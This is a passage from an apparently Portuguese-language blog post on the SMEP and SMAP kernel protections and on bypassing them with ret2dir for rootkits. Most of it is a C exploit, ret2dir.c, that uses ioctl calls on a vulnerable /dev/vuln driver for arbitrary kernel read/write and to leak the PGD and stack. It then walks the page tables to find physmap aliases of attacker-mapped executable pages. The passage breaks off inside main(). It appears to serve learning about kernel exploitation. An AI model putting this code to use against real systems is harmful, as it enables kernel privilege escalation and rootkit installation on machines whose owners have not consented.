+<p>O <strong>SMEP</strong> impede que o kernel execute código localizado na memória do espaço do usuário (userland) e bloqueia ataques que tentam redirecionar a execução do kernel para código malicioso residente em regiões não privilegiadas por meio do registrador CR4 (x86_64): O bit 20 do registrador CR4 controla o <strong>SMEP</strong>. Se habilitado, a CPU gera uma exceção (General Protection Fault, #GP) se o kernel tentar executar instruções em páginas de memória marcadas como &ldquo;userland&rdquo; (não privilegiadas). Marcação de páginas: O bit User/Supervisor (bit 2) na entrada da tabela de páginas (PTE) define se uma página pertence ao usuário (U=1) ou ao kernel (U=0). Isto se torna complicado para rootkits pois  bloqueia a injeção de shellcode em userland e exige que rootkits usem técnicas mais complexas como ROP</p>
+<p>O <strong>SMAP</strong> bloqueia o acesso do kernel a páginas de memória do espaço do usuário durante operações privilegiadas e impede que dados controlados pelo usuário sejam usados para corromper estruturas do kernel ou vazar informações sensíveis. Como funciona no low level?</p>
+<ul>
+<li>stac (Set AC Flag): Permite temporariamente acesso a userland (usado em funções como  copy_from_user).</li>
+<li>clac (Clear AC Flag): Restaura a proteção do SMAP.</li>
+<li>AC Flag: Quando SMAP está ativo, a CPU verifica a flag AC (bit 18 no registrador RFLAGS). Se</li>
+<li>AC=0, acessos a Userland são bloqueados.</li>
+</ul>
+<p>E rootkits isto é péssimo pois impede que rootkits usem dados do userland para manipular o kernel dificulta ataques de corrupção de memória que dependem de ponteiros controlados pelo usuário.
+Uma das formas de contornar esses sistemas é por meio ret2dir, dessa forma o atacante aloca grandes quantidades de memória no espaço do usuário, forçando o kernel a mapear essas páginas no <strong>physmap</strong>. Como o physmap é compartilhado entre userland e kernel, dados controlados pelo atacante podem residir em endereços conhecidos do kernel. O atacante aloca múltiplas páginas na userland, via mmap e as preenche com código malicioso (shellcode). isto é útil pois o SMAP e SMEP não impedem a execução do physmap. segue abaixo um código com esse objetivo:</p>
+<p><img alt="ret2dir" src="https://figures.semanticscholar.org/1de5ae8534fc76323e4d926e10dc0fc76a28a361/5-Figure2-1.png"></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
+<label for="tab-1-0" class="tab-label">ret2dir.c</label>
+<div class="tab-content tab-content-1-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/fcntl.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/mman.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/stat.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define VULN_READ 0x1111
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define VULN_WRITE 0x2222
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define VULN_STACK 0x3333
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define VULN_PGD 0x4444
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">struct</span> rwRequest {
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">void</span> *kaddr;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">void</span> *uaddr;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">size_t</span> length;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> pageOffsetBase = <span style="color:#3677a9">0xffff888000000000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">Open</span>(<span style="color:#6ab825;font-weight:bold">char</span> *fname, <span style="color:#6ab825;font-weight:bold">int</span> mode) {
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">int</span> fd;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> ((fd = <span style="color:#447fcf">open</span>(fname, mode)) &lt; <span style="color:#3677a9">0</span>) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">perror</span>(<span style="color:#ed9d13">&#34;open&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> fd;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">write64</span>(<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> kaddr, <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> value) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">struct</span> rwRequest req;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> value_ = value;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	req.uaddr = &amp;value_;
+</span></span><span style="display:flex;"><span>	req.length = <span style="color:#3677a9">8</span>;
+</span></span><span style="display:flex;"><span>	req.kaddr = (<span style="color:#6ab825;font-weight:bold">void</span> *)kaddr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">int</span> fd = <span style="color:#447fcf">Open</span>(<span style="color:#ed9d13">&#34;/dev/vuln&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#447fcf">ioctl</span>(fd, VULN_WRITE, &amp;req) &lt; <span style="color:#3677a9">0</span>) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">perror</span>(<span style="color:#ed9d13">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">read64</span>(<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> kaddr) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">struct</span> rwRequest req;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> value;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	req.uaddr = &amp;value;
+</span></span><span style="display:flex;"><span>	req.length = <span style="color:#3677a9">8</span>;
+</span></span><span style="display:flex;"><span>	req.kaddr = (<span style="color:#6ab825;font-weight:bold">void</span> *)kaddr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">int</span> fd = <span style="color:#447fcf">Open</span>(<span style="color:#ed9d13">&#34;/dev/vuln&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#447fcf">ioctl</span>(fd, VULN_READ, &amp;req) &lt; <span style="color:#3677a9">0</span>) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">perror</span>(<span style="color:#ed9d13">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> value;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">leak_stack</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">struct</span> rwRequest req;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> stack;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">int</span> fd = <span style="color:#447fcf">Open</span>(<span style="color:#ed9d13">&#34;/dev/vuln&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	req.uaddr = &amp;stack;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#447fcf">ioctl</span>(fd, VULN_STACK, &amp;req) &lt; <span style="color:#3677a9">0</span>) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">perror</span>(<span style="color:#ed9d13">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> stack;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">leak_pgd</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">struct</span> rwRequest req;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> pgd = <span style="color:#3677a9">0xcccccccc</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">int</span> fd = <span style="color:#447fcf">Open</span>(<span style="color:#ed9d13">&#34;/dev/vuln&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	req.uaddr = &amp;pgd;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#447fcf">ioctl</span>(fd, VULN_PGD, &amp;req) &lt; <span style="color:#3677a9">0</span>) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">perror</span>(<span style="color:#ed9d13">&#34;ioctl&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> pgd;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">find_synonym</span>(<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> pgdir, <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> vaddr) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index1 = (vaddr &gt;&gt; <span style="color:#3677a9">39</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index2 = (vaddr &gt;&gt; <span style="color:#3677a9">30</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index3 = (vaddr &gt;&gt; <span style="color:#3677a9">21</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index4 = (vaddr &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;index1: %lx, index2: %lx, index3: %lx index4: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, index1, index2, index3, index4);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv1 = <span style="color:#447fcf">read64</span>(pgdir + index1*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv1) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv1 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv1: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv1);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv2 = <span style="color:#447fcf">read64</span>((((lv1 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase + index2*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv2) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv2 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv2: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv2);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv3 = <span style="color:#447fcf">read64</span>((((lv2 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase + index3*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv3) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv3 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv3: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv3);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv4 = <span style="color:#447fcf">read64</span>((((lv3 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase + index4*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv4) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv3 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv4: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv4);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> vaddr_alias = (((lv4 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> vaddr_alias;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">pageTableWalk</span>(<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> pgdir, <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> vaddr) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index1 = (vaddr &gt;&gt; <span style="color:#3677a9">39</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index2 = (vaddr &gt;&gt; <span style="color:#3677a9">30</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index3 = (vaddr &gt;&gt; <span style="color:#3677a9">21</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> index4 = (vaddr &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x1ff</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;index1: %lx, index2: %lx, index3: %lx index4: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, index1, index2, index3, index4);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv1 = <span style="color:#447fcf">read64</span>(pgdir + index1*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv1) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv1 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv1: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv1);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv2 = <span style="color:#447fcf">read64</span>((((lv1 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase + index2*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv2) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv2 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv2: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv2);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv3 = <span style="color:#447fcf">read64</span>((((lv2 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase + index3*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv3) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv3 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv3: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv3);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> lv4 = <span style="color:#447fcf">read64</span>((((lv3 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase + index4*<span style="color:#3677a9">8</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!lv4) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[!] lv3 is invalid</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;lv4: %lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, lv4);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> vaddr_alias = (((lv4 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase;
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;vaddr alias page: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, (<span style="color:#6ab825;font-weight:bold">void</span> *)vaddr_alias);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> pte_addr = (((lv3 &gt;&gt; <span style="color:#3677a9">12</span>) &amp; <span style="color:#3677a9">0x3fffffff</span>) &lt;&lt; <span style="color:#3677a9">12</span>) + pageOffsetBase + index4*<span style="color:#3677a9">8</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;pte address: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, (<span style="color:#6ab825;font-weight:bold">void</span> *)pte_addr);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> pte_addr;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span> (<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv){
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">void</span> *rwx = <span style="color:#447fcf">mmap</span>(<span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -<span style="color:#3677a9">1</span>, <span style="color:#3677a9">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (rwx == MAP_FAILED) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">perror</span>(<span style="color:#ed9d13">&#34;mmap&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">void</span> *rw = <span style="color:#447fcf">mmap</span>(<span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -<span style="color:#3677a9">1</span>, <span style="color:#3677a9">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (rw == MAP_FAILED) {
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">perror</span>(<span style="color:#ed9d13">&#34;mmap&#34;</span>);
+</span></span><span style="display:flex;"><span>    	<span style="color:#447fcf">exit</span>(-<span style="color:#3677a9">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">memset</span>(rwx, <span style="color:#3677a9">0xcc</span>, <span style="color:#3677a9">0x1000</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">memset</span>(rw, <span style="color:#3677a9">0xcc</span>, <span style="color:#3677a9">0x1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> pgd = <span style="color:#447fcf">leak_pgd</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[*] page directory is at: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, (<span style="color:#6ab825;font-weight:bold">void</span> *)pgd);
+</span></span><span style="display:flex;"><span>
